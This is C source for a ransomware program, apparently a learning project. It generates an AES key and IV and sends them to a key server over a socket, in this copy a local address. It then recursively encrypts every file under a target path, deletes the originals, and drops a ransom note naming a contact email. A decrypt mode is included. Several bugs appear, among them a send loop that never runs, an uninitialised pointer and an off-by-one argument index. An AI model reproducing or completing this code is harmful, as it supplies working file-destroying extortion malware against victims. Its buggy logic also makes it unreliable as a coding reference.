#include "ransomlib.h"
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h> //aloc memory

// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <string.h>
#include <netdb.h>

#include <sys/types.h>
#include <errno.h>
//ransomlib.h rewrites for visibility
#define SIZEKEY AES_256_KEY_SIZE
#define SIZEIV AES_BLOCK_SIZE

#define SERVER_IP "127.0.0.1"
#define PORT 8080
#define SA struct sockaddr

void usage();
int is_encrypted(char *filename);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);

void usage(void){
    printf(
            "\nUsage:\n"
            " ./ransom [e|d] <path> <key in hex if decrypt>"
            );
    printf(
            "\nOptions:\n"
            "-e    Encrypt input and store results to output\n"
            "-d    Decrypt input and store results to output\n"
            "-h    Print this message\n"
            );
}

int is_encrypted(char *filename){
    char buffer_filename[strlen(filename)];

    strcpy(buffer_filename, filename);
    char *token = strtok(buffer_filename, ".");

    while(token != NULL){
        if(strcmp(token, "encrypt") == 0){
            return 1;
        }
        token = strtok( NULL, ".");
    }
    return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){ //Segmentation fault (core dumped)

    // https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1046380353&id=1044780608
    // Do a recursive function on dir found & exclude. and ..
    struct dirent *dir;
    DIR *d = opendir(name);
    if(d == NULL){
        perror("Can't open this file");
    }

    if(d)
    {
        while ((dir = readdir(d)) != NULL) { //loop to encrypt all files in a dir
            //char* dirname;
            //strcpy(dirname,dir->d_name);

            if( strcmp( dir->d_name, "." ) == 0 || strcmp( dir->d_name, ".." ) == 0 ){
                continue;
            }
            char filename[BUFSIZE];//char *filename;
            strcpy(filename,name);
            strcat(filename,"/");
            strcat(filename,dir->d_name);

            if (dir->d_type == DT_DIR){  //if dir
                listdir(filename,iv,key,de_flag); // recursive
            }
            else {  //if not dir
                //Encrypt
                if (de_flag == 0){
                    // We could add for exemple"|| check_file_size(path) == 0" to check if the file is big or not (time saving)
                    if((is_encrypted(filename) == 1) || strcmp(filename,"ransom.txt")==0){
                        continue;
                    }
                    else{
                        encrypt(key,iv,filename);
                        remove(filename);
                    }
                }
                //Decrypt
                if (de_flag == 1){
                    if(is_encrypted(filename) == 0){
                        decrypt(key,iv,filename);
                        remove(filename);
                    }
                }
            }
        }
        closedir(d);
    }
}
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
    RAND_bytes(key, sizeKey);
    RAND_bytes(iv, sizeIv);

    bytes_to_hexa(key, pKey, sizeKey);
    bytes_to_hexa(iv, pIv, sizeIv);

    // Print for test (to delete before use on target)
    printf("pKey: %s\n",pKey);
    printf("Key: %s\n",key);
    printf("pIv: %s\n",pIv);
    printf("iv: %s\n",iv);

    return 0;
}

int send_key(char *pKey, char *pIv)
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    // socket create and varification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("connected to the server..\n");

    // function for chat



    char *msg;
    char buffer[BUFSIZE];
    int n;

    for(n = 0; n > 2; n++) {
        bzero(buffer, BUFSIZE);
        // read client msg -> buff
        read(sockfd, buffer, BUFSIZE);
        // print buffer
        if (n == 0) {
            strcpy(msg, pKey);
            send(sockfd, msg, strlen(msg), 0);
            printf("Key sent to server.\n");
            if (recv(sockfd, buffer, sizeof(buffer), 0) < 0) {
                puts("recv failed");
            }
            printf("%s\n", buffer);
        } else if (n == 1) {
            strcpy(msg, pIv);
            send(sockfd, msg, strlen(msg), 0);
            printf("Iv sent to server.\n");
            if (recv(sockfd, buffer, sizeof(buffer), 0) < 0) {
                puts("recv failed");
            }
            printf("%s\n", buffer);
        }
        memset(msg, 0, sizeof(char));
    }
    //Delete Messages
    memset(pKey, 0, sizeof(char));
    memset(pIv, 0, sizeof(char));


    // close the socket
    close(sockfd);
}


int main (int argc, char * argv[])
{
    unsigned char *key, *iv;
    char *pKey, *pIv;

    //Binaire
    key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
    iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
    //Hexa
    pKey = (char*)calloc((SIZEKEY*2)+1,sizeof(unsigned char));
    pIv = (char*)calloc((SIZEIV*2)+1,sizeof(unsigned char));


    //Get Arguments
    if (argc > 1) {
        if (!strcmp(argv[1],"-e")) {
            if (argc != 3) {
                printf("Do something more like ./ransom -e <path>\n");
                return 0;
            }
            else {
                generate_key(key, SIZEKEY, iv, SIZEIV, pKey, pIv);
                send_key(pKey, pIv);
                listdir(argv[2],iv,key,0);

                //Ransom Letter - Cannot be written if we encrypt the whole machine (should put a condition not to encrypt ransom.txt after having created it)
                FILE* fichier = NULL;
                int currentchar = 0;
                fichier = fopen("ransom.txt", "w");

                if (fichier != NULL)
                {
                    fputs("Your Computer has been intercepted and placed under quarantine\nPlease contact us at the following address to have access to your machine unlocked:\n getpowned@yahoo.fr", fichier);

                    fclose(fichier);
                }
            }
        }
        else if (!strcmp(argv[1],"-d")) {
            if (argc != 5) {
                printf("Do something more like ./ransom -d <path> <key> <vector>\n");
                return 0;
            }
            else {
                // size verification
                if (strlen(argv[4]) == SIZEKEY){
                    hexa_to_bytes(pKey, key, SIZEKEY/2);
                }
                else {
                    printf("Wrong key size\n");
                    return 0;
                }

                if (strlen(argv[5]) == SIZEIV){
                    hexa_to_bytes(pIv, iv, SIZEIV/2);
                }
                else {
                    printf("Wrong iv size\n");
                    return 0;
                }
                listdir(argv[2],iv,key,1);
                remove("ransom.txt");
            }
        }
        else if (!strcmp(argv[1],"-h")) {
            usage();
            return 0;
        }
        else {
            printf("Wrong argument\n");
            return 0;
        }
    }
    else {
        printf("Please specify -e or -d to continue\n");
        usage();
        return 0;
    }
}

// to do Gestion des fichiers volumineux avec - st_size  #include <sys/stat.h> & #include <time.h>  https://linux.die.net/man/2/stat

